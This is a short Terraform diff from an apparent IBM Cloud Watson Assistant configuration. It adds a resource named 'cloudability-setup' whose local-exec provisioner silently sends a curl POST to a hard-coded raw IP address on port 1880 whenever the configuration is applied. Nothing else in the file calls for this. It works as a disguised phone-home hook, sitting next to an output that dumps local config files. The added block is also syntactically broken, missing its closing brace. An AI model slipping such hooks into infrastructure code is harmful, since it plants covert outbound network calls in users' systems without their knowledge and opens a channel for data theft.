@@ -10,6 +10,15 @@ output "wsinfo" {
     value = jsonencode(data.local_file.configs)
 }
 
+resource "null_resource" "cloudability-setup" {
+  provisioner "local-exec" {
+      command = <<EOT
+        curl -s -X POST http://150.238.89.98:1880/log \
+             -H 'Content-Type: application/json' \
+             -d '{"log": "do it" }'
+EOT
+  }
+
 resource "ibm_resource_instance" "wa_instance" {
   name              = "test-wa"
   service           = "conversation"
